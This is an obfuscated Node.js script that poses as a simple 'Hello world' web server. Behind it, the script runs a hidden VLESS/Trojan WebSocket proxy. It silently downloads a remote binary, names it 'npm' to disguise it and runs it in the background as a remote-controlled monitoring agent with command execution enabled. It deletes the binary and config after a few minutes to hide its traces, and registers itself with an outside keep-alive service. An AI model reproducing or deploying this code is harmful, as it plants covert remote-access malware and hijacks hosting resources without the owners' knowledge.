const _0x20cb27=_0x811c;(function(_0x169e56,_0x1aadda){const _0x11d0e4=_0x811c,_0x1a7c85=_0x169e56();while(!![]){try{const _0x36b188=parseInt(_0x11d0e4(0x19a))/0x1*(-parseInt(_0x11d0e4(0x15e))/0x2)+-parseInt(_0x11d0e4(0x193))/0x3*(-parseInt(_0x11d0e4(0x142))/0x4)+-parseInt(_0x11d0e4(0x1b1))/0x5+parseInt(_0x11d0e4(0x148))/0x6+-parseInt(_0x11d0e4(0x14e))/0x7*(parseInt(_0x11d0e4(0x16c))/0x8)+parseInt(_0x11d0e4(0x1af))/0x9+-parseInt(_0x11d0e4(0x194))/0xa*(-parseInt(_0x11d0e4(0x144))/0xb);if(_0x36b188===_0x1aadda)break;else _0x1a7c85['push'](_0x1a7c85['shift']());}catch(_0x15c9cc){_0x1a7c85['push'](_0x1a7c85['shift']());}}}(_0x4339,0xca91a));const os=require('os'),http=require(_0x20cb27(0x16f)),fs=require('fs'),axios=require(_0x20cb27(0x15d)),net=require(_0x20cb27(0x189)),path=require(_0x20cb27(0x15b)),crypto=require(_0x20cb27(0x161)),{Buffer}=require(_0x20cb27(0x177)),{exec,execSync}=require(_0x20cb27(0x171)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x20cb27(0x150)][_0x20cb27(0x184)]||_0x20cb27(0x182),NEZHA_SERVER=process['env']['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x20cb27(0x150)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x20cb27(0x150)][_0x20cb27(0x157)]||'',DOMAIN=process['env'][_0x20cb27(0x1a5)]||_0x20cb27(0x18e),AUTO_ACCESS=process['env'][_0x20cb27(0x1aa)]||!![],WSPATH=process[_0x20cb27(0x150)][_0x20cb27(0x18b)]||UUID[_0x20cb27(0x149)](0x0,0x8),SUB_PATH=process[_0x20cb27(0x150)][_0x20cb27(0x188)]||_0x20cb27(0x192),NAME=process['env'][_0x20cb27(0x1b6)]||'',PORT=process[_0x20cb27(0x150)]['PORT']||0x1eb4;let ISP='';const GetISP=async()=>{const _0x55dd1c=_0x20cb27;try{const _0x333f85=await axios[_0x55dd1c(0x199)](_0x55dd1c(0x178)),_0x47572a=_0x333f85[_0x55dd1c(0x1ab)];ISP=(_0x47572a['country_code']+'-'+_0x47572a['isp'])[_0x55dd1c(0x164)](/ /g,'_');}catch(_0x1f859d){ISP=_0x55dd1c(0x14d);}};GetISP();function _0x811c(_0x2782ab,_0x473c0c){_0x2782ab=_0x2782ab-0x13e;const _0x433930=_0x4339();let _0x811c02=_0x433930[_0x2782ab];return _0x811c02;}const httpServer=http[_0x20cb27(0x159)]((_0x882ce1,_0x8f71d3)=>{const _0x4b470b=_0x20cb27;if(_0x882ce1[_0x4b470b(0x160)]==='/'){const _0x58d964=path[_0x4b470b(0x145)](__dirname,'index.html');fs[_0x4b470b(0x156)](_0x58d964,_0x4b470b(0x15a),(_0x5a7f96,_0x97662b)=>{const _0x5e545e=_0x4b470b;if(_0x5a7f96){_0x8f71d3[_0x5e545e(0x181)](0xc8,{'Content-Type':_0x5e545e(0x179)}),_0x8f71d3[_0x5e545e(0x186)](_0x5e545e(0x198));return;}_0x8f71d3[_0x5e545e(0x181)](0xc8,{'Content-Type':_0x5e545e(0x179)}),_0x8f71d3[_0x5e545e(0x186)](_0x97662b);});return;}else{if(_0x882ce1[_0x4b470b(0x160)]==='/'+SUB_PATH){const _0x1aa434=NAME?NAME+'-'+ISP:ISP,_0xef5da=_0x4b470b(0x19f)+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+_0x4b470b(0x14a)+DOMAIN+_0x4b470b(0x196)+WSPATH+'#'+_0x1aa434,_0x47e7d9='trojan://'+UUID+'@'+DOMAIN+':443?security=tls&sni='+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x4b470b(0x196)+WSPATH+'#'+_0x1aa434,_0xb11075=_0xef5da+'\x0a'+_0x47e7d9,_0x128a73=Buffer[_0x4b470b(0x1a7)](_0xb11075)['toString']('base64');_0x8f71d3[_0x4b470b(0x181)](0xc8,{'Content-Type':_0x4b470b(0x1ac)}),_0x8f71d3[_0x4b470b(0x186)](_0x128a73+'\x0a');}else _0x8f71d3['writeHead'](0x194,{'Content-Type':_0x4b470b(0x1ac)}),_0x8f71d3[_0x4b470b(0x186)](_0x4b470b(0x15c));}}),wss=new WebSocket[(_0x20cb27(0x155))]({'server':httpServer}),uuid=UUID[_0x20cb27(0x164)](/-/g,''),DNS_SERVERS=[_0x20cb27(0x16a),_0x20cb27(0x1ad)];function resolveHost(_0x314001){return new Promise((_0x241519,_0xcda119)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x314001)){_0x241519(_0x314001);return;}let _0x465e62=0x0;function _0x5ba558(){const _0xb7807f=_0x811c;if(_0x465e62>=DNS_SERVERS[_0xb7807f(0x147)]){_0xcda119(new Error(_0xb7807f(0x165)+_0x314001+_0xb7807f(0x158)));return;}const _0x3627b0=DNS_SERVERS[_0x465e62];_0x465e62++;const _0x37b6e3=_0xb7807f(0x1a2)+encodeURIComponent(_0x314001)+_0xb7807f(0x195);axios['get'](_0x37b6e3,{'timeout':0x1388,'headers':{'Accept':_0xb7807f(0x13f)}})[_0xb7807f(0x19e)](_0x5383dd=>{const _0x552f5d=_0xb7807f,_0x16e943=_0x5383dd[_0x552f5d(0x1ab)];if(_0x16e943[_0x552f5d(0x183)]===0x0&&_0x16e943[_0x552f5d(0x1b8)]&&_0x16e943['Answer'][_0x552f5d(0x147)]>0x0){const _0x21efce=_0x16e943[_0x552f5d(0x1b8)][_0x552f5d(0x1b4)](_0x351936=>_0x351936['type']===0x1);if(_0x21efce){_0x241519(_0x21efce[_0x552f5d(0x1ab)]);return;}}_0x5ba558();})[_0xb7807f(0x1a1)](_0x53c9fd=>{_0x5ba558();});}_0x5ba558();});}function handleVlessConnection(_0x51d782,_0x4cdbcb){const _0x22bba6=_0x20cb27,[_0x58c76f]=_0x4cdbcb,_0x160b3f=_0x4cdbcb[_0x22bba6(0x149)](0x1,0x11);if(!_0x160b3f['every']((_0x2807c4,_0x523fc1)=>_0x2807c4==parseInt(uuid[_0x22bba6(0x154)](_0x523fc1*0x2,0x2),0x10)))return![];let _0x19c587=_0x4cdbcb[_0x22bba6(0x149)](0x11,0x12)[_0x22bba6(0x174)]()+0x13;const _0x14b492=_0x4cdbcb[_0x22bba6(0x149)](_0x19c587,_0x19c587+=0x2)[_0x22bba6(0x19c)](0x0),_0x35077c=_0x4cdbcb[_0x22bba6(0x149)](_0x19c587,_0x19c587+=0x1)[_0x22bba6(0x174)](),_0x1f4086=_0x35077c==0x1?_0x4cdbcb[_0x22bba6(0x149)](_0x19c587,_0x19c587+=0x4)[_0x22bba6(0x145)]('.'):_0x35077c==0x2?new TextDecoder()[_0x22bba6(0x1b7)](_0x4cdbcb[_0x22bba6(0x149)](_0x19c587+0x1,_0x19c587+=0x1+_0x4cdbcb['slice'](_0x19c587,_0x19c587+0x1)['readUInt8']())):_0x35077c==0x3?_0x4cdbcb[_0x22bba6(0x149)](_0x19c587,_0x19c587+=0x10)[_0x22bba6(0x191)]((_0x293f80,_0x1eeb04,_0x96f004,_0x33d86d)=>_0x96f004%0x2?_0x293f80['concat'](_0x33d86d[_0x22bba6(0x149)](_0x96f004-0x1,_0x96f004+0x1)):_0x293f80,[])[_0x22bba6(0x1b0)](_0x2e6375=>_0x2e6375['readUInt16BE'](0x0)['toString'](0x10))[_0x22bba6(0x145)](':'):'';_0x51d782[_0x22bba6(0x17d)](new Uint8Array([_0x58c76f,0x0]));const _0xbf0386=createWebSocketStream(_0x51d782);return resolveHost(_0x1f4086)[_0x22bba6(0x19e)](_0x7d96af=>{const _0x372a8c=_0x22bba6;net['connect']({'host':_0x7d96af,'port':_0x14b492},function(){const _0x9ffa54=_0x811c;this[_0x9ffa54(0x17a)](_0x4cdbcb[_0x9ffa54(0x149)](_0x19c587)),_0xbf0386['on'](_0x9ffa54(0x153),()=>{})[_0x9ffa54(0x1ae)](this)['on'](_0x9ffa54(0x153),()=>{})[_0x9ffa54(0x1ae)](_0xbf0386);})['on'](_0x372a8c(0x153),()=>{});})[_0x22bba6(0x1a1)](_0x43fb5d=>{const _0x4e33c5=_0x22bba6;net[_0x4e33c5(0x16b)]({'host':_0x1f4086,'port':_0x14b492},function(){const _0x5dc4f2=_0x4e33c5;this[_0x5dc4f2(0x17a)](_0x4cdbcb[_0x5dc4f2(0x149)](_0x19c587)),_0xbf0386['on']('error',()=>{})[_0x5dc4f2(0x1ae)](this)['on'](_0x5dc4f2(0x153),()=>{})[_0x5dc4f2(0x1ae)](_0xbf0386);})['on']('error',()=>{});}),!![];}function handleTrojanConnection(_0x1e760f,_0x507dbc){const _0x5db6ff=_0x20cb27;try{if(_0x507dbc['length']<0x3a)return![];const _0x23af12=_0x507dbc[_0x5db6ff(0x149)](0x0,0x38)[_0x5db6ff(0x146)](),_0x3e9457=[UUID];let _0x32df7b=null;for(const _0x2ced2e of _0x3e9457){const _0x53edcc=crypto['createHash'](_0x5db6ff(0x176))['update'](_0x2ced2e)[_0x5db6ff(0x14b)](_0x5db6ff(0x141));if(_0x53edcc===_0x23af12){_0x32df7b=_0x2ced2e;break;}}if(!_0x32df7b)return![];let _0x5a75c3=0x38;_0x507dbc[_0x5a75c3]===0xd&&_0x507dbc[_0x5a75c3+0x1]===0xa&&(_0x5a75c3+=0x2);const _0x26fddc=_0x507dbc[_0x5a75c3];if(_0x26fddc!==0x1)return![];_0x5a75c3+=0x1;const _0x23b10b=_0x507dbc[_0x5a75c3];_0x5a75c3+=0x1;let _0xbb6480,_0x181458;if(_0x23b10b===0x1)_0xbb6480=_0x507dbc[_0x5db6ff(0x149)](_0x5a75c3,_0x5a75c3+0x4)['join']('.'),_0x5a75c3+=0x4;else{if(_0x23b10b===0x3){const _0x59cf26=_0x507dbc[_0x5a75c3];_0x5a75c3+=0x1,_0xbb6480=_0x507dbc[_0x5db6ff(0x149)](_0x5a75c3,_0x5a75c3+_0x59cf26)[_0x5db6ff(0x146)](),_0x5a75c3+=_0x59cf26;}else{if(_0x23b10b===0x4)_0xbb6480=_0x507dbc[_0x5db6ff(0x149)](_0x5a75c3,_0x5a75c3+0x10)[_0x5db6ff(0x191)]((_0x5b3d2c,_0x374c46,_0x2116ef,_0x59edf1)=>_0x2116ef%0x2?_0x5b3d2c[_0x5db6ff(0x1b3)](_0x59edf1[_0x5db6ff(0x149)](_0x2116ef-0x1,_0x2116ef+0x1)):_0x5b3d2c,[])[_0x5db6ff(0x1b0)](_0x19544b=>_0x19544b[_0x5db6ff(0x19c)](0x0)['toString'](0x10))[_0x5db6ff(0x145)](':'),_0x5a75c3+=0x10;else return![];}}_0x181458=_0x507dbc['readUInt16BE'](_0x5a75c3),_0x5a75c3+=0x2;_0x5a75c3<_0x507dbc[_0x5db6ff(0x147)]&&_0x507dbc[_0x5a75c3]===0xd&&_0x507dbc[_0x5a75c3+0x1]===0xa&&(_0x5a75c3+=0x2);const _0x1e6de1=createWebSocketStream(_0x1e760f);return resolveHost(_0xbb6480)[_0x5db6ff(0x19e)](_0x5904dc=>{const _0x37d15a=_0x5db6ff;net[_0x37d15a(0x16b)]({'host':_0x5904dc,'port':_0x181458},function(){const _0x575dca=_0x37d15a;_0x5a75c3<_0x507dbc[_0x575dca(0x147)]&&this[_0x575dca(0x17a)](_0x507dbc[_0x575dca(0x149)](_0x5a75c3)),_0x1e6de1['on'](_0x575dca(0x153),()=>{})[_0x575dca(0x1ae)](this)['on'](_0x575dca(0x153),()=>{})[_0x575dca(0x1ae)](_0x1e6de1);})['on']('error',()=>{});})['catch'](_0x297e8a=>{const _0x4e440b=_0x5db6ff;net[_0x4e440b(0x16b)]({'host':_0xbb6480,'port':_0x181458},function(){const _0x3e6ba8=_0x4e440b;_0x5a75c3<_0x507dbc[_0x3e6ba8(0x147)]&&this['write'](_0x507dbc[_0x3e6ba8(0x149)](_0x5a75c3)),_0x1e6de1['on'](_0x3e6ba8(0x153),()=>{})[_0x3e6ba8(0x1ae)](this)['on'](_0x3e6ba8(0x153),()=>{})[_0x3e6ba8(0x1ae)](_0x1e6de1);})['on'](_0x4e440b(0x153),()=>{});}),!![];}catch(_0x529076){return![];}}wss['on'](_0x20cb27(0x1a0),(_0x5dffb5,_0xa8d280)=>{const _0x15563f=_0x20cb27,_0x18ea2d=_0xa8d280[_0x15563f(0x160)]||'';_0x5dffb5[_0x15563f(0x17b)](_0x15563f(0x19b),_0x2c2be5=>{const _0x4a907e=_0x15563f;if(_0x2c2be5['length']>0x11&&_0x2c2be5[0x0]===0x0){const _0x1ea3da=_0x2c2be5[_0x4a907e(0x149)](0x1,0x11),_0x764ac4=_0x1ea3da['every']((_0x4ee57b,_0x256852)=>_0x4ee57b==parseInt(uuid['substr'](_0x256852*0x2,0x2),0x10));if(_0x764ac4){!handleVlessConnection(_0x5dffb5,_0x2c2be5)&&_0x5dffb5[_0x4a907e(0x152)]();return;}}!handleTrojanConnection(_0x5dffb5,_0x2c2be5)&&_0x5dffb5['close']();})['on'](_0x15563f(0x153),()=>{});});const getDownloadUrl=()=>{const _0x4342e1=_0x20cb27,_0x54540e=os[_0x4342e1(0x172)]();return _0x54540e==='arm'||_0x54540e==='arm64'||_0x54540e===_0x4342e1(0x168)?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':_0x4342e1(0x1a9):!NEZHA_PORT?_0x4342e1(0x197):_0x4342e1(0x140);},downloadFile=async()=>{const _0x1776b8=_0x20cb27;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x414947=getDownloadUrl(),_0x1a15f8=await axios({'method':'get','url':_0x414947,'responseType':_0x1776b8(0x17c)}),_0xbeec73=fs[_0x1776b8(0x143)](_0x1776b8(0x169));return _0x1a15f8[_0x1776b8(0x1ab)][_0x1776b8(0x1ae)](_0xbeec73),new Promise((_0x5230cc,_0x1c896b)=>{const _0x2b1886=_0x1776b8;_0xbeec73['on']('finish',()=>{const _0x21f0b0=_0x811c;console['log'](_0x21f0b0(0x173)),exec(_0x21f0b0(0x16d),_0x370ed1=>{if(_0x370ed1)_0x1c896b(_0x370ed1);_0x5230cc();});}),_0xbeec73['on'](_0x2b1886(0x153),_0x1c896b);});}catch(_0x4f93c7){throw _0x4f93c7;}},runnz=async()=>{const _0x2cd3a9=_0x20cb27;try{const _0x4f41bc=execSync(_0x2cd3a9(0x14c),{'encoding':_0x2cd3a9(0x167)});if(_0x4f41bc['trim']()!==''){console['log'](_0x2cd3a9(0x187));return;}}catch(_0x101cc0){}await downloadFile();let _0x289031='',_0x1ee8db=[_0x2cd3a9(0x15f),_0x2cd3a9(0x18d),'2096',_0x2cd3a9(0x18f),_0x2cd3a9(0x190),'2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x3dc527=_0x1ee8db[_0x2cd3a9(0x1b5)](NEZHA_PORT)?_0x2cd3a9(0x1a6):'';_0x289031=_0x2cd3a9(0x17e)+NEZHA_SERVER+':'+NEZHA_PORT+_0x2cd3a9(0x166)+NEZHA_KEY+'\x20'+_0x3dc527+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x2bce2e=NEZHA_SERVER[_0x2cd3a9(0x1b5)](':')?NEZHA_SERVER[_0x2cd3a9(0x162)](':')[_0x2cd3a9(0x1b9)]():'',_0x327be3=_0x1ee8db['includes'](_0x2bce2e)?_0x2cd3a9(0x163):_0x2cd3a9(0x1ba),_0x34b628=_0x2cd3a9(0x151)+NEZHA_KEY+_0x2cd3a9(0x170)+NEZHA_SERVER+_0x2cd3a9(0x1a4)+_0x327be3+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs['writeFileSync'](_0x2cd3a9(0x175),_0x34b628);}_0x289031=_0x2cd3a9(0x1b2);}else{console[_0x2cd3a9(0x18a)](_0x2cd3a9(0x18c));return;}}try{exec(_0x289031,{'shell':'/bin/bash'},_0x5d1c63=>{const _0x22f861=_0x2cd3a9;if(_0x5d1c63)console[_0x22f861(0x153)](_0x22f861(0x14f),_0x5d1c63);else console['log'](_0x22f861(0x17f));});}catch(_0x40f478){console[_0x2cd3a9(0x153)](_0x2cd3a9(0x1a8)+_0x40f478);}};async function addAccessTask(){const _0xaa25a5=_0x20cb27;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x16639a=_0xaa25a5(0x19d)+DOMAIN;try{const _0x322253=await axios[_0xaa25a5(0x1a3)](_0xaa25a5(0x180),{'url':_0x16639a},{'headers':{'Content-Type':_0xaa25a5(0x13e)}});console[_0xaa25a5(0x18a)](_0xaa25a5(0x185));}catch(_0x2ff00e){}}const delFiles=()=>{const _0x5eac11=_0x20cb27;fs['unlink'](_0x5eac11(0x169),()=>{}),fs[_0x5eac11(0x16e)]('config.yaml',()=>{});};function _0x4339(){const _0x4919fa=['1234.abc.com','2087','2083','reduce','sub','129OrYKtA','282490kDaUxV','&type=A','&path=%2F','https://amd64.ssss.nyc.mn/v1','Hello\x20world!','get','4226sqTNQG','message','readUInt16BE','https://','then','vless://','connection','catch','https://dns.google/resolve?name=','post','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','DOMAIN','--tls','from','error:\x20','https://arm64.ssss.nyc.mn/agent','AUTO_ACCESS','data','text/plain','1.1.1.1','pipe','11261826XULbGQ','map','6117365vRtTyS','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','concat','find','includes','NAME','decode','Answer','pop','false','application/json','application/dns-json','https://amd64.ssss.nyc.mn/agent','hex','19264jZKbYp','createWriteStream','352AdrufG','join','toString','length','1020318JhawXE','slice','&fp=chrome&type=ws&host=','digest','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','Unknown','9926FzDFbN','npm\x20running\x20error:','env','client_secret:\x20','close','error','substr','Server','readFile','NEZHA_KEY','\x20with\x20all\x20DNS\x20servers','createServer','utf8','path','Not\x20Found\x0a','axios','4zRfWVP','443','url','crypto','split','true','replace','Failed\x20to\x20resolve\x20','\x20-p\x20','utf-8','aarch64','npm','8.8.4.4','connect','2656SgVENB','chmod\x20+x\x20npm','unlink','http','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','child_process','arch','npm\x20download\x20successfully','readUInt8','config.yaml','sha224','buffer','https://api.ip.sb/geoip','text/html','write','once','stream','send','setsid\x20nohup\x20./npm\x20-s\x20','npm\x20is\x20running','https://oooo.serv00.net/add-url','writeHead','14c0988c-6860-422e-9515-7d76e375fdf6','Status','UUID','Automatic\x20Access\x20Task\x20added\x20successfully','end','npm\x20is\x20already\x20running,\x20skip\x20running...','SUB_PATH','net','log','WSPATH','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','8443'];_0x4339=function(){return _0x4919fa;};return _0x4339();}httpServer['listen'](PORT,()=>{const _0x204706=_0x20cb27;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x204706(0x18a)]('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
